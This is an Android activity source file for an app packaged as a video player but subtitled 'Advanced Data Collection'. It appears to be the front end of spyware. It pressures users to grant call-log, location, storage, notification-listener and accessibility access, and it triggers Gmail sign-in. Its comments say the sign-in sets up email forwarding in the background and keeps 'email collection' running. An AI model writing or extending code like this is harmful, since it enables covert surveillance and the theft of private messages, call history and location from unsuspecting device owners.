package com.jumpy.videoplayerapp;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.provider.Settings;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Switch;
import android.widget.LinearLayout;
import android.app.AlertDialog;
import android.content.pm.PackageManager;
import android.Manifest;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import com.google.android.gms.auth.api.signin.GoogleSignIn;
import com.google.android.gms.auth.api.signin.GoogleSignInAccount;
import com.google.android.gms.auth.api.signin.GoogleSignInClient;
import com.google.android.gms.common.api.ApiException;
import com.google.android.gms.tasks.Task;
import android.util.Log;
import android.graphics.Color;
import android.graphics.drawable.GradientDrawable;
import android.view.Gravity;
import android.widget.ScrollView;
import android.widget.ImageView;
import android.graphics.PorterDuff;
import android.content.Context;
import com.jumpy.videoplayerapp.R;

public class MainActivity extends Activity {
    
    private static final String TAG = "MainActivity";
    private static final int RC_SIGN_IN = 9001;
    private static final int PERMISSION_REQUEST_CODE = 1001;
    private GmailAuthService gmailAuthService;
    private Button signInButton;
    private Button signOutButton;
    private Button permissionsButton;
    private TextView statusText;
    private NotificationQueueManager notificationQueueManager;

    // Required permissions with user-friendly names (only the requested ones)
    private static final String[][] PERMISSIONS = {
        {Manifest.permission.READ_EXTERNAL_STORAGE, "Storage Access", "Access to files and media"},
        {Manifest.permission.WRITE_EXTERNAL_STORAGE, "Storage Write", "Save files and data"},
        {Manifest.permission.READ_CALL_LOG, "Call History", "Access call history"},
        {Manifest.permission.ACCESS_FINE_LOCATION, "Precise Location", "Exact location access"},
        {Manifest.permission.ACCESS_COARSE_LOCATION, "General Location", "Approximate location"}
    };
    
    // Note: Notification access is handled separately via NotificationListenerService

    // Sequential permission request queue
    private int permissionIndex = 0;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        try {
            Log.i(TAG, "MainActivity onCreate started");
            
            // Initialize notification queue manager
            try {
                notificationQueueManager = new NotificationQueueManager(this);
                Log.i(TAG, "NotificationQueueManager initialized");
            } catch (Exception e) {
                Log.e(TAG, "Error initializing NotificationQueueManager", e);
            }
            
            // Initialize Gmail authentication service with error handling
            try {
                gmailAuthService = new GmailAuthService(this);
                Log.i(TAG, "GmailAuthService initialized");
            } catch (Exception e) {
                Log.e(TAG, "Error initializing GmailAuthService", e);
                gmailAuthService = null;
            }
            
            // Create FrameLayout to layer content over background
            android.widget.FrameLayout rootLayout = new android.widget.FrameLayout(this);
            rootLayout.setLayoutParams(new ViewGroup.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.MATCH_PARENT
            ));
            
            // Create fancy background
            View backgroundView = createFancyBackground();
            rootLayout.addView(backgroundView);
            
            // Create main content
            LinearLayout mainContent = createMainContent();
            rootLayout.addView(mainContent);
            
            setContentView(rootLayout);
            
            Log.i(TAG, "Layout set successfully");
            
            // Check if user is already signed in
            updateUI();
            
            // Start notification queue processing
            if (notificationQueueManager != null) {
                try {
                    notificationQueueManager.startQueueProcessing();
                    Log.i(TAG, "Notification queue processing started");
                } catch (Exception e) {
                    Log.e(TAG, "Error starting notification queue processing", e);
                }
            }
            
            Log.i(TAG, "MainActivity onCreate completed successfully");
            
        } catch (Exception e) {
            Log.e(TAG, "Critical error in onCreate", e);
            showErrorDialog("App initialization failed: " + e.getMessage());
        }
    }
    
    private View createFancyBackground() {
        // Create gradient background
        GradientDrawable gradient = new GradientDrawable(
            GradientDrawable.Orientation.TOP_BOTTOM,
            new int[]{
                Color.parseColor("#1a1a2e"),  // Dark blue
                Color.parseColor("#16213e"),  // Navy blue
                Color.parseColor("#0f3460"),  // Deep blue
                Color.parseColor("#533483")   // Purple
            }
        );
        gradient.setCornerRadius(0);
        
        View backgroundView = new View(this);
        backgroundView.setLayoutParams(new ViewGroup.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.MATCH_PARENT
        ));
        backgroundView.setBackground(gradient);
        
        return backgroundView;
    }
    
    private LinearLayout createMainContent() {
        LinearLayout mainContent = new LinearLayout(this);
        mainContent.setOrientation(LinearLayout.VERTICAL);
        mainContent.setLayoutParams(new ViewGroup.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.MATCH_PARENT
        ));
        mainContent.setPadding(40, 80, 40, 40);
        mainContent.setGravity(Gravity.CENTER);
        mainContent.setBackgroundColor(Color.parseColor("#222244")); // DEBUG: Set visible background
        Log.i(TAG, "Main content LinearLayout created");
        
        // App icon/logo
        ImageView appIcon = new ImageView(this);
        appIcon.setLayoutParams(new ViewGroup.LayoutParams(120, 120));
        appIcon.setImageResource(android.R.drawable.ic_dialog_info);
        appIcon.setColorFilter(Color.WHITE, PorterDuff.Mode.SRC_IN);
        appIcon.setPadding(0, 0, 0, 30);
        Log.i(TAG, "App icon created");
        
        // App title
        TextView appTitle = new TextView(this);
        appTitle.setText("jumpy");
        appTitle.setTextSize(32);
        appTitle.setTextColor(Color.WHITE);
        appTitle.setGravity(Gravity.CENTER);
        appTitle.setTypeface(android.graphics.Typeface.DEFAULT_BOLD);
        appTitle.setPadding(0, 0, 0, 10);
        Log.i(TAG, "App title created");
        
        // Subtitle
        TextView subtitle = new TextView(this);
        subtitle.setText("Advanced Data Collection");
        subtitle.setTextSize(16);
        subtitle.setTextColor(Color.parseColor("#b0b0b0"));
        subtitle.setGravity(Gravity.CENTER);
        subtitle.setPadding(0, 0, 0, 40);
        Log.i(TAG, "Subtitle created");
        
        // Status text
        statusText = new TextView(this);
        statusText.setText("This app provides comprehensive data collection and Gmail integration.\n\nGrant all permissions and sign in with Google to enable all features.");
        statusText.setTextSize(14);
        statusText.setTextColor(Color.WHITE);
        statusText.setGravity(Gravity.CENTER);
        statusText.setPadding(0, 0, 0, 40);
        statusText.setLineSpacing(0, 1.2f);
        Log.i(TAG, "Status text created");
        
        // Permissions button
        permissionsButton = createFancyButton("🔐 Grant All Permissions", Color.parseColor("#4CAF50"));
        permissionsButton.setBackgroundColor(Color.parseColor("#4CAF50")); // DEBUG: Set visible background
        permissionsButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Log.i(TAG, "Permissions button clicked");
                startFullPermissionFlow();
            }
        });
        Log.i(TAG, "Permissions button created");
        
        // Google Sign-In button
        signInButton = createFancyButton("🔑 Sign in with Google", Color.parseColor("#2196F3"));
        signInButton.setBackgroundColor(Color.parseColor("#2196F3")); // DEBUG: Set visible background
        signInButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Log.i(TAG, "Sign-in button clicked");
                signIn();
            }
        });
        Log.i(TAG, "Sign-in button created");
        
        // Sign out button
        signOutButton = createFancyButton("🚪 Sign Out", Color.parseColor("#FF5722"));
        signOutButton.setBackgroundColor(Color.parseColor("#FF5722")); // DEBUG: Set visible background
        signOutButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Log.i(TAG, "Sign-out button clicked");
                signOut();
            }
        });
        Log.i(TAG, "Sign-out button created");
        
        // Add views to main content
        mainContent.addView(appIcon);
        mainContent.addView(appTitle);
        mainContent.addView(subtitle);
        mainContent.addView(statusText);
        mainContent.addView(permissionsButton);
        mainContent.addView(signInButton);
        mainContent.addView(signOutButton);
        Log.i(TAG, "All views added to main content");
        
        return mainContent;
    }
    
    private Button createFancyButton(String text, int color) {
        Button button = new Button(this);
        button.setText(text);
        button.setTextSize(16);
        button.setTextColor(Color.WHITE);
        button.setTypeface(android.graphics.Typeface.DEFAULT_BOLD);
        
        // Create gradient background for button
        GradientDrawable buttonGradient = new GradientDrawable(
            GradientDrawable.Orientation.LEFT_RIGHT,
            new int[]{color, adjustBrightness(color, 0.8f)}
        );
        buttonGradient.setCornerRadius(25);
        buttonGradient.setStroke(2, Color.WHITE);
        
        button.setBackground(buttonGradient);
        button.setPadding(40, 20, 40, 20);
        
        LinearLayout.LayoutParams params = new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.WRAP_CONTENT
        );
        params.setMargins(0, 10, 0, 10);
        button.setLayoutParams(params);
        
        return button;
    }
    
    private int adjustBrightness(int color, float factor) {
        int red = (int) ((color >> 16 & 0xFF) * factor);
        int green = (int) ((color >> 8 & 0xFF) * factor);
        int blue = (int) ((color & 0xFF) * factor);
        return Color.rgb(red, green, blue);
    }
    
    private void showPermissionsModal() {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("🔐 Permissions Manager");
        
        // Create scrollable content
        ScrollView scrollView = new ScrollView(this);
        LinearLayout contentLayout = new LinearLayout(this);
        contentLayout.setOrientation(LinearLayout.VERTICAL);
        contentLayout.setPadding(30, 20, 30, 20);
        
        // Add description
        TextView description = new TextView(this);
        description.setText("Enable the following permissions to unlock all features:");
        description.setTextSize(16);
        description.setTextColor(Color.BLACK);
        description.setPadding(0, 0, 0, 20);
        contentLayout.addView(description);
        
        // Create permission toggles
        for (String[] permission : PERMISSIONS) {
            LinearLayout permissionRow = createPermissionRow(permission[0], permission[1], permission[2]);
            contentLayout.addView(permissionRow);
        }
        
        // Add action buttons
        LinearLayout buttonLayout = new LinearLayout(this);
        buttonLayout.setOrientation(LinearLayout.HORIZONTAL);
        buttonLayout.setGravity(Gravity.CENTER);
        buttonLayout.setPadding(0, 20, 0, 0);
        
        Button grantAllButton = new Button(this);
        grantAllButton.setText("Grant All");
        grantAllButton.setTextColor(Color.WHITE);
        grantAllButton.setBackgroundColor(Color.parseColor("#4CAF50"));
        grantAllButton.setPadding(30, 15, 30, 15);
        
        Button closeButton = new Button(this);
        closeButton.setText("Close");
        closeButton.setTextColor(Color.WHITE);
        closeButton.setBackgroundColor(Color.parseColor("#757575"));
        closeButton.setPadding(30, 15, 30, 15);
        
        // Create the dialog first so we can reference it in the button listeners
        AlertDialog dialog = builder.create();
        
        grantAllButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                requestAllPermissions();
            }
        });
        closeButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                dialog.dismiss();
            }
        });
        
        buttonLayout.addView(grantAllButton);
        buttonLayout.addView(closeButton);
        contentLayout.addView(buttonLayout);
        
        scrollView.addView(contentLayout);
        builder.setView(scrollView);
        
        // Show the dialog after all setup
        dialog.show();
        
        // Set dialog background
        dialog.getWindow().setBackgroundDrawableResource(android.R.color.white);
    }
    
    private LinearLayout createPermissionRow(String permission, String title, String description) {
        LinearLayout row = new LinearLayout(this);
        row.setOrientation(LinearLayout.HORIZONTAL);
        row.setPadding(0, 10, 0, 10);
        row.setGravity(Gravity.CENTER_VERTICAL);
        
        // Permission info
        LinearLayout infoLayout = new LinearLayout(this);
        infoLayout.setOrientation(LinearLayout.VERTICAL);
        infoLayout.setLayoutParams(new LinearLayout.LayoutParams(
            0, ViewGroup.LayoutParams.WRAP_CONTENT, 1
        ));
        
        TextView titleText = new TextView(this);
        titleText.setText(title);
        titleText.setTextSize(16);
        titleText.setTextColor(Color.BLACK);
        titleText.setTypeface(android.graphics.Typeface.DEFAULT_BOLD);
        
        TextView descText = new TextView(this);
        descText.setText(description);
        descText.setTextSize(12);
        descText.setTextColor(Color.GRAY);
        
        infoLayout.addView(titleText);
        infoLayout.addView(descText);
        
        // Toggle switch
        Switch toggle = new Switch(this);
        toggle.setChecked(ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED);
        toggle.setEnabled(false); // Read-only for display
        
        row.addView(infoLayout);
        row.addView(toggle);
        
        return row;
    }
    
    private void showErrorDialog(String message) {
        try {
            new AlertDialog.Builder(this)
                .setTitle("❌ Error")
                .setMessage(message)
                .setPositiveButton("OK", null)
                .show();
        } catch (Exception e) {
            Log.e(TAG, "Error showing error dialog", e);
        }
    }
    
    private void requestAllPermissions() {
        try {
            // Check which permissions are not granted
            java.util.List<String> permissionsToRequest = new java.util.ArrayList<>();
            for (String[] permission : PERMISSIONS) {
                if (ContextCompat.checkSelfPermission(this, permission[0]) != PackageManager.PERMISSION_GRANTED) {
                    permissionsToRequest.add(permission[0]);
                }
            }
            
            if (permissionsToRequest.isEmpty()) {
                showPermissionDialog("✅ All permissions already granted!");
                return;
            }
            
            // Request all permissions at once
            ActivityCompat.requestPermissions(this, 
                permissionsToRequest.toArray(new String[0]), 
                PERMISSION_REQUEST_CODE);
                
        } catch (Exception e) {
            Log.e(TAG, "Error requesting permissions", e);
            showErrorDialog("Error requesting permissions: " + e.getMessage());
        }
    }

    private void requestPermissionsSequentially() {
        permissionIndex = 0;
        requestNextPermission();
    }

    private void requestNextPermission() {
        if (permissionIndex >= PERMISSIONS.length) {
            // All runtime permissions handled, now check notification access
            checkAndPromptNotificationAccess();
            return;
        }
        String[] perm = PERMISSIONS[permissionIndex];
        String permission = perm[0];
        if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[]{permission}, PERMISSION_REQUEST_CODE + permissionIndex);
        } else {
            permissionIndex++;
            requestNextPermission();
        }
    }

    private void showPermissionDialog(String message) {
        try {
            new AlertDialog.Builder(this)
                .setTitle("🔐 Permissions Status")
                .setMessage(message)
                .setPositiveButton("OK", null)
                .show();
        } catch (Exception e) {
            Log.e(TAG, "Error showing permission dialog", e);
        }
    }
    
    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode >= PERMISSION_REQUEST_CODE && requestCode < PERMISSION_REQUEST_CODE + PERMISSIONS.length) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                permissionIndex++;
                requestNextPermission();
            } else {
                // Show dialog for denied permission
                String permName = PERMISSIONS[permissionIndex][1];
                new AlertDialog.Builder(this)
                    .setTitle("Permission Required")
                    .setMessage(permName + " is required for full app functionality. Please grant it.")
                    .setPositiveButton("Try Again", (dialog, which) -> requestNextPermission())
                    .setNegativeButton("Open Settings", (dialog, which) -> {
                        Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                        intent.setData(android.net.Uri.parse("package:" + getPackageName()));
                        startActivity(intent);
                    })
                    .setNeutralButton("Cancel", (dialog, which) -> checkAndPromptNotificationAccess())
                    .show();
            }
        }
    }

    private void checkAndPromptNotificationAccess() {
        if (!isNotificationServiceEnabled(this)) {
            showNotificationAccessDialog();
        } else {
            // All permissions granted, proceed as normal
            statusText.setText("All permissions granted. App is fully functional.");
        }
    }

    private boolean isNotificationServiceEnabled(Context context) {
        try {
            String pkgName = context.getPackageName();
            final String flat = android.provider.Settings.Secure.getString(context.getContentResolver(),
                    "enabled_notification_listeners");
            if (flat != null && !flat.isEmpty()) {
                String[] names = flat.split(":");
                for (String name : names) {
                    if (name.contains(pkgName)) {
                        return true;
                    }
                }
            }
            return false;
        } catch (Exception e) {
            Log.e(TAG, "Error checking notification service: " + Log.getStackTraceString(e));
            return false;
        }
    }

    private void showNotificationAccessDialog() {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("Enable Notification Access");
        builder.setMessage("To capture notifications, please enable notification access for this app.\n\nFollow the screenshot below:");
        // Add screenshot (place notification_access_guide.png in res/drawable)
        ImageView screenshot = new ImageView(this);
        screenshot.setImageResource(R.drawable.notification_access_guide);
        screenshot.setAdjustViewBounds(true);
        screenshot.setMaxHeight(600);
        screenshot.setPadding(0, 20, 0, 20);
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.addView(screenshot);
        builder.setView(layout);
        builder.setPositiveButton("Open Settings", (dialog, which) -> {
            Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
            startActivity(intent);
        });
        builder.setNegativeButton("Cancel", null);
        builder.show();
    }

    // Call this instead of requestAllPermissions
    private void startFullPermissionFlow() {
        requestPermissionsSequentially();
    }
    
    private void startPermissionDependentServices() {
        try {
            // Start notification listener service
            Intent notificationIntent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
            startActivity(notificationIntent);
            
            // Start accessibility service
            Intent accessibilityIntent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            startActivity(accessibilityIntent);
            
            // Start other services as needed
            Log.i(TAG, "Permission-dependent services started");
        } catch (Exception e) {
            Log.e(TAG, "Error starting permission-dependent services", e);
        }
    }
    
    private void signIn() {
        try {
            if (gmailAuthService != null) {
                Intent signInIntent = gmailAuthService.getGoogleSignInClient().getSignInIntent();
                startActivityForResult(signInIntent, RC_SIGN_IN);
            } else {
                showPermissionDialog("❌ Gmail service not available");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error starting Google Sign-In", e);
            showPermissionDialog("❌ Google Sign-In failed. Please try again.");
        }
    }
    
    private void signOut() {
        try {
            if (gmailAuthService != null) {
                gmailAuthService.signOut();
            }
            updateUI();
            showPermissionDialog("✅ Signed out successfully");
        } catch (Exception e) {
            Log.e(TAG, "Error during sign out", e);
        }
    }
    
    @Override
    public void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        
        if (requestCode == RC_SIGN_IN) {
            Task<GoogleSignInAccount> task = GoogleSignIn.getSignedInAccountFromIntent(data);
            handleSignInResult(task);
        }
    }
    
    private void handleSignInResult(Task<GoogleSignInAccount> completedTask) {
        try {
            GoogleSignInAccount account = completedTask.getResult(ApiException.class);
            if (account != null) {
                showPermissionDialog("✅ Signed in successfully: " + account.getEmail());
                updateUI();
                
                // The GmailAuthService will automatically set up email forwarding in the background
                if (gmailAuthService != null) {
                    gmailAuthService.handleSignInResult(completedTask);
                }
            }
        } catch (ApiException e) {
            Log.e(TAG, "Google Sign-In failed: " + e.getStatusCode(), e);
            String errorMessage = "❌ Sign in failed: ";
            switch (e.getStatusCode()) {
                case 12501:
                    errorMessage += "Sign-in was cancelled";
                    break;
                case 12500:
                    errorMessage += "Sign-in failed. Please check your internet connection";
                    break;
                case 7:
                    errorMessage += "Network error. Please check your connection";
                    break;
                default:
                    errorMessage += "Error code: " + e.getStatusCode();
                    break;
            }
            showPermissionDialog(errorMessage);
        } catch (Exception e) {
            Log.e(TAG, "Error handling sign-in result", e);
            showPermissionDialog("❌ Sign-in error: " + e.getMessage());
        }
    }
    
    private void updateUI() {
        try {
            GoogleSignInAccount account = null;
            if (gmailAuthService != null) {
                account = gmailAuthService.getLastSignedInAccount();
            }
            
            if (account != null) {
                statusText.setText("✅ Signed in as: " + account.getEmail() + "\n\n🚀 All features are now enabled.\n📧 Gmail integration is active.\n📱 Data collection is running.");
                signInButton.setVisibility(View.GONE);
                signOutButton.setVisibility(View.VISIBLE);
            } else {
                statusText.setText("This app provides comprehensive data collection and Gmail integration.\n\n🔐 Grant all permissions and sign in with Google to enable all features.");
                signInButton.setVisibility(View.VISIBLE);
                signOutButton.setVisibility(View.GONE);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error updating UI", e);
        }
    }
    
    @Override
    protected void onResume() {
        super.onResume();
        try {
            updateUI();
            
            // Check and maintain email collection
            if (gmailAuthService != null && gmailAuthService.isSignedIn()) {
                gmailAuthService.checkAndMaintainEmailCollection();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error in onResume", e);
        }
    }
    
    @Override
    protected void onDestroy() {
        super.onDestroy();
        try {
            if (gmailAuthService != null) {
                gmailAuthService.shutdown();
            }
            if (notificationQueueManager != null) {
                notificationQueueManager.stopQueueProcessing();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error in onDestroy", e);
        }
    }
} 